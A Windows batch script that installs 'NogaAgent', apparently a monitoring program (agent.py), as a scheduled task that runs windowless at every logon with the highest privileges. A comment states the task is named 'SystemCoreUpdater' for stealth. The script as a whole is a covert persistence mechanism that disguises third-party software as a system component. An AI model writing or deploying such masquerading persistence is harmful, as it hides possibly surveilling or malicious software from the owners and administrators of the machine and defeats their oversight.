@echo off
set SCRIPT_DIR=%~dp0
set MONITOR_PATH=%SCRIPT_DIR%agent.py

echo Setting up background task for NogaAgent...

REM Delete existing task if it exists (using a more generic name for stealth)
schtasks /delete /tn "SystemCoreUpdater" /f >nul 2>&1

REM Create new task to run at logon
schtasks /create /tn "SystemCoreUpdater" /tr "pythonw.exe \"%MONITOR_PATH%\"" /sc ONLOGON /rl HIGHEST /f

if %errorlevel% equ 0 (
    echo [OK] Task scheduled successfully as 'SystemCoreUpdater'.
    echo [OK] Starting background process now...
    start /min "" pythonw.exe "%MONITOR_PATH%"
) else (
    echo [ERROR] Failed to schedule task. You might need to run this as Administrator.
)

pause
